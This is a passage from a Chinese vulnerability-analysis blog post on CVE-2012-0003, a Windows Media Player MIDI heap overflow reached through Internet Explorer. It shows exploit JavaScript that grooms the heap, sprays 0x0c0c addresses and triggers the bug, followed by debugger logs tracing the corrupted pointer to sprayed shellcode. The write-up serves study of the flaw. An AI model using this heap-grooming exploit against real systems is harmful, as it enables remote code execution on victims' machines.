<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">heap</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">heapLib</span><span class="p">.</span><span class="nx">ie</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">selob</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;select&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w0</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u0c0c%u0c0c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w1</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w2</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w3</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w4</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w5</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w6</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w7</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w8</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="p">....</span><span class="nx">省略</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w53</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w54</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl"><span class="nx">selob</span><span class="p">.</span><span class="nx">w55</span> <span class="o">=</span> <span class="nx">alert</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">clones</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">feng_shui</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">heap</span><span class="p">.</span><span class="nx">gc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">clones</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">selob</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">i</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">delete</span> <span class="nx">clones</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="nx">CollectGarbage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nx">j</span>  <span class="o">=</span> <span class="nx">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">feng_shui</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">999</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="nx">k</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">clones</span><span class="p">[</span><span class="nx">k</span><span class="p">].</span><span class="nx">w0</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">clones</span><span class="p">[</span><span class="nx">k</span><span class="p">].</span><span class="nx">w0</span><span class="p">(</span><span class="s1">&#39;come on!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">k</span> <span class="o">=</span> <span class="nx">k</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">feng_shui</span><span class="p">();</span><span class="nx">js</span>
</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">audio</span><span class="p">.</span><span class="nx">Play</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在clone、free还有midi分配内存的地方分别设置条件断点：</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109112818573.png" alt="image-20200109112818573"></p>
<p>运行后查看log，找到vulBuffer和其匹配的释放地址，”插空“成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">7E279860   COND: 111free = 02A8D158
</span></span><span class="line"><span class="cl">.....
</span></span><span class="line"><span class="cl">76B2CDEE   COND: vulBuffer alloc = 02A8D158
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后调试下越界写和shellcode跳转：</p>
<ul>
<li>漏洞点断下，此时esi指向0x08</li>
</ul>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109113157044.png" alt="image-20200109113157044"></p>
<ul>
<li>+1 变成0x09，w1由string类型变为object类型，他的字符串就会被错当成指针</li>
</ul>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109113220900.png" alt="image-20200109113220900"></p>
<ul>
<li>在CAttrValue::GetIntoVariant中找到调用虚表指针的地方，下断点；取001c9cdc</li>
</ul>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109113348497.png" alt="image-20200109113348497"></p>
<ul>
<li>001c9cdc指向0c0c0c0c，经典的堆喷射地址，后面就是跳转到布局好的shellcode执行了。</li>
</ul>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109113558545.png" alt="image-20200109113558545"></p>
<h2 id="总结">总结</h2>
<ol>
<li>调堆还是得用windbg，试了下Immunity Debugger的!heap功能不咋好用，这里关于堆的地方有点模糊</li>
<li>这里字符串在内存中的布局有点奇怪，我<a href="https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf">查到</a>的应该是这种格式</li>
</ol>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109114413247.png" alt="image-20200109114413247"></p>
<ol start="3">
<li>条件断点，设clone alloc那里没太搞懂，原因还是对ie中的数据结构、内存结构不了解</li>
<li>堆喷射只知道套路。</li>
</ol>
<h2 id="参考">参考</h2>
<ul>
<li>《漏洞战争》</li>
</ul>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">b1tg</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        2020-01-10
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/cve-2017-11882-office-eqnedt32/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">CVE-2017-11882 Microsoft Office stack overflow 漏洞分析</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        <a class="next" href="/post/cve-2010-3333-microsoft-rtf-stack-overflow/">
            <span class="next-text nav-default">CVE-2010-3333 Microsoft RTF stack overflow 漏洞分析</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>
    <script src="https://giscus.app/client.js"
    data-repo="b1tg/b1tg.github.io"
    data-repo-id="MDEwOlJlcG9zaXRvcnkyMjIxMDgzNDI="
    data-category="Discuss"
    data-category-id="DIC_kwDODT0ats4CQAsT"
    data-mapping="title"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="preferred_color_scheme"
    data-lang="en"
    crossorigin="anonymous"
    async>
</script>
    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="http://github.com/b1tg" class="iconfont icon-github" title="github"></a>
  <a href="https://b1tg.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2018 - 
    2024<span class="heart"><i class="iconfont icon-heart"></i></span><span>b1tg</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>





<script src="https://t.usermaven.com/lib.js"
    data-key="UM6sMIrGGS"
    data-tracking-host="https://events.usermaven.com"
    data-autocapture="true"
    defer>
</script>
<script>window.usermaven = window.usermaven || (function(){(window.usermavenQ = window.usermavenQ || []).push(arguments);})</script>







</body>

</html>
